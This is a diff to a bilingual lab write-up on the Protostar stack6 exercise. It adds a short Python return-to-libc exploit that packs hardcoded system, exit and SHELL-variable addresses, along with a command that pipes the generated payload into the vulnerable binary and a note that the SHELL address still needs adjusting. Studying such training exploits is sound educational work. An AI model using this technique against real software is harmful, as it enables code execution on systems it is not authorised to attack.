@@ -98,11 +98,11 @@ x/s \* \(\(char \*\*\)environ+x\)   x是一个数字，然后就打印出相应�
 
 ![](/png/31.png)
 
-
-
 5）编写漏洞利用代码exploit.py
 
-    结构如下：
+```
+结构如下：
+```
 
 import struct
 
@@ -115,6 +115,16 @@ exit = struct.pack\("I",0xb7ec60c0\)
 shell = struct.pack\("I",0xbfffff82\)
 
 print buff+system+exit+shell
+
+
+
+![](/png/32.png)
+
+ We have to remember that the address of `SHELL`is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. `python /tmp/stack6.py > /tmp/payload` , Then we will cat the file and pipe the output to `./stack6`
+
+
+
+ 难点在于需要调整SHELL变量的地址。测试了好几次没找到正好地。明天接着试试。
 
 ref：
 
